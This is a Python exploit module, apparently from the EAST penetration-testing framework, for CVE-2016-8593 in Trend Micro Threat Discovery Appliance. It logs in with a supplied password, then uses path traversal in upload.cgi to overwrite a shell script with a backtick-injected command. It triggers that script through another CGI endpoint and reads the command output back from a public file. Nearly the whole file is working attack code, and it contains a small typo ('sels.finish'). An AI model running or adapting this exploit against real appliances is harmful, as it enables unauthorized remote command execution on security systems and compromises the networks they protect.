#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import time
import requests

sys.path.append('./core')
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_trend_micro_threat_discovery_appliance_rce"
INFO['DESCRIPTION'] = "Trend Micro Threat Discovery Appliance 2.6.1062r1 upload.cgi Remote Code Execution"
INFO['VENDOR'] = "http://www.trendmicro.com"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['http://0day.today/exploit/27624']
INFO["CVE Name"] = "CVE-2016-8593"
INFO["NOTES"] = """There exists a post authenticated upload vulnerability that can be used to execute arbitrary code.
"""
INFO['CHANGELOG'] = "21 Apr, 2017. Written by Gleg team."
INFO['PATH'] = 'Exploits/General/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "127.0.0.1", dict(description = 'Target IP')
OPTIONS["PORT"] = 80, dict(description = 'Target port')
OPTIONS["PASSWORD"] = 'admin123', dict(description = 'Password')
OPTIONS["COMMAND"] = 'ls -l', dict(description = 'Command to execute')


class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.password = self.args.get('PASSWORD', OPTIONS["PASSWORD"])
        self.command = self.args.get('COMMAND', OPTIONS["COMMAND"])
        requests.packages.urllib3.disable_warnings()
        
    def make_url(self, path = ''):
        return 'https://{}:{}{}'.format(self.host, self.port, path)
        
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
        
        l_url = self.make_url('/cgi-bin/logon.cgi')
        u_url = self.make_url('/cgi-bin/upload.cgi?dID=../../opt/TrendMicro/MinorityReport/www/cgi-bin/log_cache.sh')
        e_url = self.make_url('/cgi-bin/log_query_system.cgi')
        r_url = self.make_url('/nonprotect/si.txt')
        
        s = requests.Session()
        r = s.post(l_url, data={ "passwd":self.password, "isCookieEnable":1 }, verify=False)
        if "frame.cgi" in r.text:
            self.log("(+) logged in...")

            bd = "`{}>/opt/TrendMicro/MinorityReport/www/nonprotect/si.txt`".format(self.command)
            u = {
                'ajaxuploader_file': ('si', bd, 'text/plain'), 
            }
            r = s.post(u_url, files=u, verify=False)
            r = s.post(e_url, data={'act':'search','cache_id':''}, verify=False)
            r = s.get(r_url, verify=False)
            self.log(r.text.rstrip())
        else:
            self.log("(-) login failed")
            sels.finish(False)
            
        self.finish(True)

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
